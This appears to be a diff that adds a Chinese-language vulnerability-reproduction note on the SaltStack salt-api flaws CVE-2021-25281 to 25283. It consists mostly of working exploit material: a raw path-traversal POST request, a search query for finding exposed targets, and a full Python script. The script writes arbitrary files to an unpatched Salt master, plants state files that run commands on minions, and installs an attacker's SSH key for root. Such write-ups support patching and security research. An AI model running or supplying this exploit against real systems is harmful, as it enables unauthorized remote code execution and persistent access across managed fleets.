@@ -1,0 +1,181 @@
+# Saltstack 未授权RCE漏洞 CVE-2021-25281~25283
+
+## 漏洞描述
+
+SaltStack套件是政企机构 IT运维管理人员常用的管理工具，利用这些漏洞，最严重情形可导致未授权远程代码执行。
+
+- CVE-2021-25281：salt-api wheel_async未授权访问
+
+- CVE-2021-25283：sdb rest插件模版渲染问题 
+
+- CVE-2021-25282：wheel/pillar_roots.py文件任意写漏洞 (
+
+参考链接：
+
+- https://mp.weixin.qq.com/s/iu4cS_DZTs0sVVg92RBe4Q
+- https://mp.weixin.qq.com/s/QvQoTuQJVthxS07pbLWJmg
+- https://saltproject.io/security_announcements/active-saltstack-cve-release-2021-feb-25/
+- https://dozer.nz/posts/saltapi-vulns
+- https://github.com/Immersive-Labs-Sec/CVE-2021-25281
+
+## 漏洞影响
+
+```
+Saltstack 3002.2之前的所有版本
+SaltStack =< 3002.2
+SaltStack =< 3001.4
+SaltStack =< 3000.6
+```
+
+## 网络测绘
+
+```
+app="SALTSTACK-产品"
+```
+
+## 漏洞复现
+
+CVE-2021-25281 + CVE-2021-25282 poc：
+
+```
+http://target/run
+POST:
+"client": "wheel_async",
+"fun": "pillar_roots.write",
+"data": "../../../../../tmp/test2",
+"path": "../../../../../tmp/test2",
+"username": "password",
+"password": "username",
+"eauth": "pam"
+```
+
+CVE-2021-25281.py：
+
+```python
+# Copyright (C) 2021 Alex Seymour, Immersive Labs
+# https://github.com/Immersive-Labs-Sec/CVE-2021-25281
+#
+# Permission is hereby granted, free of charge, to any person obtaining a copy
+# of this software and associated documentation files (the "Software"), to deal
+# in the Software without restriction, including without limitation the rights
+# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+# copies of the Software, and to permit persons to whom the Software is
+# furnished to do so, subject to the following conditions:
+
+# The above copyright notice and this permission notice shall be included in all
+# copies or substantial portions of the Software.
+
+# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+# SOFTWARE.
+from argparse import ArgumentParser, Namespace
+from pathlib import Path
+from secrets import token_hex
+from textwrap import dedent
+
+import requests
+import urllib3
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+
+def read_file(file_path: Path):
+    try:
+        with file_path.open() as handle:
+            return handle.read()
+    except OSError:
+        print(f'[-] Cannot read file {file_path}')
+        exit(1)
+
+
+def send_request(url: str, path: str, data: str):
+    path = path[1:] if path.startswith('/') else path
+    url = f'https://{url}/run' if not url.startswith(('http', 'https')) else f'{url}/run'
+    try:
+        response = requests.post(
+            url,
+            verify=False,
+            json={
+                'eauth': 'auto',
+                'client': 'wheel_async',
+                'fun': 'pillar_roots.write',
+                'data': data,
+                'path': f'../../../../../../{path}',
+            },
+        )
+    except requests.RequestException:
+        print(f'[-] Failed to send request to {url}')
+        exit(1)
+
+    if json := response.json():
+        print(f'[+] Got JID: {json["return"][0]["jid"]}, the job was queued successfully')
+    else:
+        print('[-] No JID was returned, the request may have failed or the target is not vulnerable')
+
+
+def handle_write_file(args: Namespace):
+    if args.file:
+        file_contents = read_file(args.file)
+    elif args.data:
+        file_contents = args.data
+    else:
+        print('[-] Either file or data is required')
+        exit(1)
+
+    print('[+] Attempting to write file')
+    send_request(args.target, args.path, file_contents)
+
+
+def handle_state_file(args: Namespace):
+    state_file_path = Path('/srv') / 'salt' / f'{token_hex(16)}.sls'
+    file_contents = dedent(f"""\
+    '{args.cmd}':
+      cmd.run
+    """)
+
+    print(f'[+] Attempting to write command to {state_file_path} state file')
+    send_request(args.target, f'/srv/salt/{state_file_path.name}', file_contents)
+
+
+def handle_ssh_key(args: Namespace):
+    public_key = read_file(args.public_key)
+
+    print(f'[+] Attempting to write an authorized key for user {args.user}')
+    if args.user == 'root':
+        send_request(args.target, '/root/.ssh/authorized_keys', public_key)
+    else:
+        send_request(args.target, f'/home/{args.user}/.ssh/authorized_keys', public_key)
+
+
+def main():
+    parser = ArgumentParser()
+    parser.add_argument('target', help='The URL of the target Salt master')
+    subparsers = parser.add_subparsers()
+
+    write_parser = subparsers.add_parser('write', help='Write data to a file on the master')
+    write_parser.add_argument('path', help='The file path to write to on the target')
+    write_parser.add_argument('-f', '--file', type=Path, help='A file to upload to the target')
+    write_parser.add_argument('-d', '--data', help='The raw contents to write to a file')
+    write_parser.set_defaults(func=handle_write_file)
+
+    state_parser = subparsers.add_parser('state', help='Create a state file to try and run commands on minions')
+    state_parser.add_argument('cmd', help='A command to add to a new state file')
+    state_parser.set_defaults(func=handle_state_file)
+
+    ssh_parser = subparsers.add_parser('ssh', help='Write an SSH key to try and gain remote access to the master')
+    ssh_parser.add_argument('public_key', type=Path, help='A file containing the public key to upload')
+    ssh_parser.add_argument('-u', '--user', default='root', help='The user on the target to try and upload the key to')
+    ssh_parser.set_defaults(func=handle_ssh_key)
+
+    args = parser.parse_args()
+    args.func(args)
+
+
+if __name__ == '__main__':
+    main()
+```
+
